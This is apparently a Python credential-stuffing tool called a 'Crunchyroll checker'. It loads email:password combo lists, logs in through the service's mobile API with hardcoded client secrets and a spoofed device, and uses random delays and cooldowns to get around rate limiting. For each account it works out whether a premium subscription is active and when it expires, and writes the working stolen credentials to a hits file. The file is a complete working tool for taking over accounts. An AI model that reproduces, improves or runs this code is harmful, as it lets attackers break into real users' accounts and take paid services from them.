import requests
import uuid
import json
import os
import time
import random
from datetime import datetime

class CrunchyrollChecker:
    def __init__(self):
        self.client_id = "ajcylfwdtjjtq7qpgks3"
        self.client_secret = "oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_"
        self.headers = {
            "host": "beta-api.crunchyroll.com",
            "x-datadog-sampling-priority": "0",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": "Crunchyroll/3.74.2 Android/10 okhttp/4.12.0"
        }

    def get_country_name(self, code):
        countries = {
            "US": "United States 🇺🇸", "GB": "United Kingdom 🇬🇧", "ZA": "South Africa 🇿🇦",
            "BR": "Brazil 🇧🇷", "MX": "Mexico 🇲🇽", "FR": "France 🇫🇷", "DE": "Germany 🇩🇪"
        }
        return countries.get(code, code)

    def check_account(self, email, password):
        session = requests.Session()
        device_id = str(uuid.uuid4())

        # Login Data
        login_url = "https://beta-api.crunchyroll.com/auth/v1/token"
        login_data = {
            "grant_type": "password",
            "username": email,
            "password": password,
            "scope": "offline_access",
            "client_id": self.client_id,
            "client_secret": self.client_secret,
            "device_type": "SamsungTV",
            "device_id": device_id,
            "device_name": "Goku"
        }

        try:
            response = session.post(login_url, headers=self.headers, data=login_data)
            text_response = response.text
            status_code = response.status_code

            # --- RATE LIMIT CHECK ---
            if status_code == 429 or "rate limited" in text_response.lower():
                return {"status": "RATELIMIT", "data": "IP Flagged - Cooling down"}

            # Try to parse JSON
            try:
                json_resp = response.json()
            except:
                return {"status": "RETRY", "data": "Bad Response"}

            # Valid Login Check
            if "access_token" not in json_resp:
                error_msg = json_resp.get("error", "")
                if "invalid_grant" in error_msg:
                    return {"status": "FAIL", "data": "Invalid Credentials"}
                return {"status": "RETRY", "data": f"Unknown Error: {error_msg}"}

            # --- LOGIN SUCCESSFUL ---
            access_token = json_resp["access_token"]
            session.headers.update({"Authorization": f"Bearer {access_token}"})

            # Get Profile
            profile = session.get("https://beta-api.crunchyroll.com/accounts/v1/me").json()
            external_id = profile.get("external_id")

            # Get Benefits
            session.headers.update({"etp-anonymous-id": device_id})
            benefits = session.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits").json()

            total_benefits = benefits.get("total", 0)
            country = self.get_country_name(benefits.get("subscription_country", "N/A"))

            plan = "Free"
            if "items" in benefits:
                for item in benefits["items"]:
                    if "concurrent_streams" in item.get("benefit", ""):
                        plan = "Premium"
                        break

            # Get Expiry
            sub_resp = session.get(f"https://beta-api.crunchyroll.com/subs/v4/accounts/{json_resp['profile_id']}/subscriptions").json()

            days_left = 0
            expiry_date = "N/A"

            if "items" in sub_resp and sub_resp["items"]:
                sub_data = sub_resp["items"][0]
                renewal = sub_data.get("nextRenewalDate")
                if renewal:
                    dt = datetime.fromisoformat(renewal.replace('Z', '+00:00'))
                    expiry_date = dt.strftime("%Y-%m-%d")
                    days_left = (dt.replace(tzinfo=None) - datetime.now()).days

            # Final Status
            if total_benefits > 0 and days_left >= 0:
                status = "SUCCESS"
            elif days_left < 0 and total_benefits > 0:
                status = "EXPIRED"
            else:
                status = "FREE"

            return {
                "status": status,
                "email": email,
                "plan": plan,
                "country": country,
                "expiry": expiry_date,
                "days": days_left
            }

        except Exception as e:
            return {"status": "ERROR", "data": str(e)}

def main():
    input_file = "accoun.txt"
    if not os.path.exists(input_file):
        print(f"[!] {input_file} not found. Creating sample...")
        with open(input_file, "w") as f: f.write("user:pass\n")
        return

    checker = CrunchyrollChecker()

    with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if ":" in l]

    total = len(lines)
    print(f"[*] Loaded {total} accounts. Starting with rate limits enabled...\n")

    for i, line in enumerate(lines):
        email, password = line.split(":", 1)

        # --- RATE LIMIT DELAY (3 to 6 seconds) ---
        time.sleep(random.uniform(10, 20))

        print(f"[{i+1}/{total}] Checking {email}...", end="\r")
        result = checker.check_account(email, password)

        # Output Handling
        if result["status"] == "SUCCESS":
            print(f" [HIT] {email}                          ")
            print(f" ╰ Plan: {result['plan']} | Days: {result['days']} | Country: {result['country']}")
            with open("hits.txt", "a") as h:
                h.write(f"{email}:{password} | {result['plan']} | Exp: {result['expiry']}\n")

        elif result["status"] == "FREE":
            print(f" [FREE] {email}                          ")

        elif result["status"] == "FAIL":
            print(f" [FAIL] {email}                          ")

        elif result["status"] == "RATELIMIT":
            print(f" [!!!] IP BLOCKED on {email}. Cooling down for 60s...    ")
            time.sleep(100) # COOLDOWN

        elif result["status"] == "RETRY":
             print(f" [RETRY] {email} - {result['data']}              ")

        elif result["status"] == "EXPIRED":
             print(f" [EXP] {email}                           ")

        else:
            print(f" [ERR] {email} - {result['data']}               ")

if __name__ == "__main__":
    main()
